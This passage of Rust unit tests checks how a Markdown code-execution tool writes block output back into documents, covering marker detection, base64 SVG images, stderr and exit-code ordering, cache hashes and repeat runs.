    /// Regression test for a real bug: `output_byte_ranges` used to accept
    /// *any* `<!-- meshfox:output ` text not literally inside a fence as a
    /// region start, not just one that actually follows a real fence the
    /// way `write_output` places one. A document that simply *mentions*
    /// the marker syntax in ordinary prose (this crate's own doc comments,
    /// or — the real-world case that surfaced this — a personal notes file
    /// discussing this exact feature) would trip that: the bare mention
    /// got treated as a start, and everything up to the next
    /// coincidentally-`<!-- /meshfox:output -->`-shaped text far later in
    /// the document silently became invisible to `mdcanvas::scan`'s
    /// heading detection — headings in between stopped being real nodes at
    /// all, with no error, just missing structure.
    #[test]
    fn output_byte_ranges_ignores_a_bare_mention_in_prose_even_far_from_any_fence() {
        let md = "# Root\n\n\
                  Some text mentioning `<!-- meshfox:output name=\"x\" hash=\"y\" -->` inline, \
                  not after any real fence.\n\n\
                  ## Real Section\n\
                  <!-- meshfox:node id=\"real-section\" -->\n\n\
                  More text, and later on, a totally unrelated mention of \
                  `<!-- /meshfox:output -->` too.\n";
        assert!(output_byte_ranges(md).is_empty());

        let canvas = crate::mdcanvas::parse(md).unwrap();
        assert_eq!(canvas.nodes.len(), 2);
        assert!(canvas.node("real-section").is_some());
    }

    // `output="image"` — see `render_output_block_image`.
    const SVG: &str = r#"<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><rect width="4" height="4"/></svg>"#;

    #[test]
    fn base64_encode_matches_rfc4648_vectors() {
        for (input, expected) in [
            ("", ""),
            ("f", "Zg=="),
            ("fo", "Zm8="),
            ("foo", "Zm9v"),
            ("foob", "Zm9vYg=="),
            ("fooba", "Zm9vYmE="),
            ("foobar", "Zm9vYmFy"),
        ] {
            assert_eq!(base64_encode(input.as_bytes()), expected, "{input:?}");
        }
    }

    fn image_doc(fence_attrs: &str) -> String {
        format!("# R\n<!-- meshfox:node id=\"r\" -->\n\n```bash name=\"d\" cache output=\"image\"{fence_attrs}\nx\n```\n")
    }

    #[test]
    fn image_mode_wraps_an_svg_stdout_into_a_data_url_image() {
        let result = write_output(&image_doc(""), "d", &out(0, SVG)).unwrap();
        let expected = format!(
            "![d](data:image/svg+xml;base64,{})",
            base64_encode(SVG.as_bytes())
        );
        assert!(result.contains(&expected), "{result}");
        assert!(
            result.contains("<!-- meshfox:output name=\"d\""),
            "{result}"
        );
        assert!(!result.contains("exit code"), "{result}");
        // Nothing after the image but the region's own end marker.
        assert!(
            result.contains(&format!("{expected}\n\n<!-- /meshfox:output -->")),
            "{result}"
        );
    }

    #[test]
    fn image_mode_forwards_output_attrs_in_canonical_form() {
        let doc = image_doc(" output-attrs=\"bg=#FFF width=50%\"");
        let result = write_output(&doc, "d", &out(0, SVG)).unwrap();
        assert!(result.contains("){width=50% bg=#ffffff}\n"), "{result}");
    }

    #[test]
    fn image_mode_leaves_off_invalid_output_attrs() {
        let doc = image_doc(" output-attrs=\"color=red\"");
        let result = write_output(&doc, "d", &out(0, SVG)).unwrap();
        assert!(result.contains("base64,"), "{result}");
        assert!(!result.contains('{'), "{result}");
    }

    #[test]
    fn image_mode_shows_non_svg_stdout_in_a_plain_fence_not_as_stderr() {
        let result = write_output(&image_doc(""), "d", &out(0, "plantuml: not found")).unwrap();
        assert!(result.contains("```\nplantuml: not found\n```"), "{result}");
        assert!(!result.contains("```text"), "{result}");
        assert!(!result.contains("data:image"), "{result}");
        assert!(!result.contains("exit code"), "{result}");
    }

    #[test]
    fn image_mode_marks_a_failed_run_with_the_exit_code_line_even_with_svg_stdout() {
        let result = write_output(&image_doc(""), "d", &out(2, SVG)).unwrap();
        assert!(result.contains("**⚠ exit code: 2 · 0ms**"), "{result}");
        assert!(!result.contains("data:image"), "{result}");
        assert!(result.contains("<svg xmlns"), "{result}");
    }

    #[test]
    fn image_mode_fallback_keeps_stderr_first_then_exit_line_then_stdout() {
        let mut o = out(1, "oops stdout");
        o.stderr = "boom\n".to_string();
        let result = write_output(&image_doc(""), "d", &o).unwrap();
        let (a, b, c) = (
            result.find("```text\nboom").unwrap(),
            result.find("**⚠ exit code: 1").unwrap(),
            result.find("```\noops stdout").unwrap(),
        );
        assert!(a < b && b < c, "{result}");
    }

    #[test]
    fn image_mode_shows_stderr_as_its_own_block_before_the_image() {
        let mut o = out(0, SVG);
        o.stderr = "warning: font fallback\n".to_string();
        let result = write_output(&image_doc(""), "d", &o).unwrap();
        let warn = result.find("warning: font fallback").unwrap();
        let img = result.find("![d](").unwrap();
        assert!(warn < img, "{result}");
        assert!(
            result.contains("```text\nwarning: font fallback\n```"),
            "{result}"
        );
    }

    #[test]
    fn image_mode_rewrites_in_place_on_a_rerun() {
        let once = write_output(&image_doc(""), "d", &out(0, SVG)).unwrap();
        let twice = write_output(&once, "d", &out(0, SVG)).unwrap();
        assert_eq!(once, twice);
        assert_eq!(twice.matches("meshfox:output name=").count(), 1);
        assert_eq!(twice.matches("![d](").count(), 1);
        assert_eq!(
            cached_output_hash(&once, "d"),
            cached_output_hash(&twice, "d")
        );
    }

    #[test]
    fn editing_output_attrs_invalidates_the_cached_hash_but_nothing_else_does() {
        let plain = write_output(&image_doc(""), "d", &out(0, SVG)).unwrap();
        let backed_doc = image_doc(" output-attrs=\"bg=#fff\"");
        // Output written for the plain fence is stale under the edited one.
        let stale = plain.replace(&image_doc(""), &backed_doc);
        assert_ne!(
            cached_output_hash(&stale, "d"),
            cached_output_hash(&write_output(&backed_doc, "d", &out(0, SVG)).unwrap(), "d")
        );
        // A fence without output-attrs keeps the hash it always had.
        let md = "```bash name=\"x\" cache\nhi\n```\n";
        let b = &scan_code_blocks(md)[0];
        let rebuilt = crate::fence::fingerprint(b);
        assert_eq!(rebuilt, crate::fence::fingerprint(&scan_code_blocks(md)[0]));
    }

    // Regression: every re-run used to add one more blank line after the
    // region (the rendered region's own trailing newline plus the one
    // already starting the text after it) — in every output mode.
    fn rerun_is_a_fixed_point(doc: &str, out_a: ExecOutput, out_b: ExecOutput) {
        let once = write_output(doc, "t", &out_a).unwrap();
        let twice = write_output(&once, "t", &out_b).unwrap();
        let thrice = write_output(&twice, "t", &out_b).unwrap();
        assert_eq!(
            twice, thrice,
            "a re-run must not change the document further"
        );
        // Same output again is a fixed point from the very first run on.
        let again = write_output(&once, "t", &out_a).unwrap();
        assert_eq!(once, again);
    }

    #[test]
    fn rerunning_a_text_mode_block_does_not_grow_the_document() {
        for tail in ["", "\nNext para\n", "\n\nNext para\n", "\n## Next node\n"] {
            let doc = format!("# R\n\n```bash name=\"t\" cache\nx\n```\n{tail}");
            rerun_is_a_fixed_point(&doc, out(0, "hi"), out(1, "other"));
        }
    }

    #[test]
    fn rerunning_a_markdown_mode_block_does_not_grow_the_document() {
        for tail in ["", "\nNext para\n", "\n\nNext para\n"] {
            let doc =
                format!("# R\n\n```bash name=\"t\" cache output=\"markdown\"\nx\n```\n{tail}");
            rerun_is_a_fixed_point(
                &doc,
                out(0, "| a |\n|---|\n| 1 |"),
                out(0, "| b |\n|---|\n| 2 |"),
            );
        }
    }

    #[test]
    fn rerunning_an_image_mode_block_does_not_grow_the_document() {
        for tail in ["", "\nNext para\n", "\n\nNext para\n"] {
            let doc = format!("# R\n\n```bash name=\"t\" cache output=\"image\"\nx\n```\n{tail}");
            rerun_is_a_fixed_point(&doc, out(0, SVG), out(0, "not an svg"));
        }
    }

    #[test]
    fn a_fence_at_end_of_file_with_no_trailing_newline_still_gets_a_clean_region() {
        let doc = "```bash name=\"t\" cache\nx\n```";
        let once = write_output(doc, "t", &out(0, "hi")).unwrap();
        assert!(once.ends_with("<!-- /meshfox:output -->\n"), "{once:?}");
        assert_eq!(write_output(&once, "t", &out(0, "hi")).unwrap(), once);
    }

    #[test]
    fn the_blank_line_between_a_block_and_the_next_paragraph_is_kept_as_it_was() {
        let doc = "```bash name=\"t\" cache\nx\n```\n\nNext para\n";
        let result = write_output(doc, "t", &out(0, "hi")).unwrap();
        assert!(
            result.ends_with("<!-- /meshfox:output -->\n\nNext para\n"),
            "{result:?}"
        );
    }
}
